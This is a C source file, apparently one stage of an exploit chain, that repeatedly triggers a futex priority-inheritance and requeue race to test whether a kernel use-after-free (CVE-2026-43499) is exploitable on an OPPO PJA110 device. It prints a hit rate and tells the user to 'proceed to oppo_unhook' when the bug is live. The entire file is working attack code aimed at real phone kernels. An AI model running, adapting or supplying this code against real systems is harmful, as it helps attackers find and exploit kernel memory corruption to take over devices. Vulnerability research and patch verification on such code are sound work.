/*
 * oracle_test.c — GhostLock EDEADLK Oracle (pure verification)
 * =============================================================
 *
 * Verifies the CVE-2026-43499 UAF is exploitable on this device.
 * Based on oracle.c from inforcqb/CVE-2026-43499 (same device: OP5943L1).
 *
 * If this prints "EDEADLK ORACLE WORKS" → UAF is live, proceed to oppo_unhook.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <stdarg.h>
#include <sys/syscall.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_PRIVATE_FLAG      128
#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t futex1 = 0, futex2 = 0, cycle_futex = 0;
static volatile int a_ready = 0, w_waiting = 0, exploit_phase2 = 0;

static long xfutex(uint32_t *u, int op, uint32_t v, void *ts, uint32_t *u2, uint32_t v3)
{ return syscall(SYS_futex, u, op, v, ts, u2, v3); }

static void dbg(const char *s) { write(2, s, strlen(s)); }
static void dbg_fmt(const char *fmt, ...)
{ char b[256]; va_list ap; va_start(ap,fmt); int n=vsnprintf(b,256,fmt,ap); va_end(ap); write(2,b,n<256?n:256); }

static void pin_cpu(int cpu)
{
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu%sysconf(_SC_NPROCESSORS_ONLN),&cs);
    syscall(SYS_sched_setaffinity, (pid_t)syscall(SYS_gettid), sizeof(cs), &cs);
}

static void *thread_a(void *unused)
{
    (void)unused; pin_cpu(3);
    pid_t tid __attribute__((unused)) = (pid_t)syscall(SYS_gettid);

    __atomic_store_n(&futex2, 0, __ATOMIC_RELEASE);
    long r = xfutex(&futex2, FLPI, 0, NULL, NULL, 0);
    dbg_fmt("[A] FLPI(futex2)=%ld errno=%d\n", r, errno);
    __atomic_store_n(&a_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE)) sched_yield();
    usleep(50000);

    dbg("[A] blocking on cycle_futex...\n");
    r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    dbg_fmt("[A] FLPI(cycle_futex)=%ld errno=%d\n", r, errno);

    if (r == 0) xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    xfutex(&futex2, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_w(void *unused)
{
    (void)unused; pin_cpu(2);
    pid_t tid = (pid_t)syscall(SYS_gettid);

    while (!__atomic_load_n(&a_ready, __ATOMIC_ACQUIRE)) sched_yield();

    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    usleep(10000);

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;
    dbg("[W] FWRQ(futex1,2s,futex2)...\n");
    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);

    long r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    dbg_fmt("[W] FWRQ=%ld errno=%d\n", r, errno);

    __atomic_store_n(&exploit_phase2, 1, __ATOMIC_RELEASE);

    /* Spin ~200ms to give M probe window */
    struct timespec deadline;
    clock_gettime(CLOCK_MONOTONIC, &deadline);
    deadline.tv_nsec += 200000000;
    if (deadline.tv_nsec >= 1000000000) { deadline.tv_nsec -= 1000000000; deadline.tv_sec++; }
    while (1) {
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > deadline.tv_sec ||
            (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec))
            break;
    }

    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;
    int success = 0, total = 0;

    dbg("GhostLock EDEADLK Oracle — device verification\n");
    dbg("Target: OPPO PJA110 (OP5943L1), kernel 5.15.180\n\n");

    for (int attempt = 1; attempt <= 20; attempt++) {
        pthread_t at, wt;
        futex1 = futex2 = cycle_futex = 0;
        a_ready = w_waiting = exploit_phase2 = 0;

        pthread_create(&at, NULL, thread_a, NULL);
        pthread_create(&wt, NULL, thread_w, NULL);

        while (!__atomic_load_n(&exploit_phase2, __ATOMIC_ACQUIRE)) sched_yield();

        pin_cpu(0);
        struct timespec t1, t2;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long r = xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
        clock_gettime(CLOCK_MONOTONIC, &t2);
        long us = (t2.tv_sec - t1.tv_sec) * 1000000 + (t2.tv_nsec - t1.tv_nsec) / 1000;
        total++;

        if (r == -1 && errno == EDEADLK) {
            dbg_fmt("  #%d: EDEADLK %ldus  [HIT]\n", attempt, us);
            success++;
        } else if (r == 0) {
            dbg_fmt("  #%d: OK     %ldus  [miss]\n", attempt, us);
            xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
        } else {
            dbg_fmt("  #%d: r=%ld  %ldus  [???]\n", attempt, r, us);
        }

        pthread_join(wt, NULL);
        pthread_join(at, NULL);
        usleep(50000);
    }

    float rate = total > 0 ? (float)success / total * 100.0f : 0;
    dbg_fmt("\n[*] Oracle result: %d/%d hits (%.0f%%)\n", success, total, rate);

    if (rate > 50)
        dbg("[+] VERDICT: UAF exploitable — proceed to oppo_unhook\n");
    else if (rate > 0)
        dbg("[~] VERDICT: Oracle works but unreliable\n");
    else
        dbg("[-] VERDICT: Oracle failed — kernel may be patched\n");

    return (rate > 0) ? 0 : 1;
}
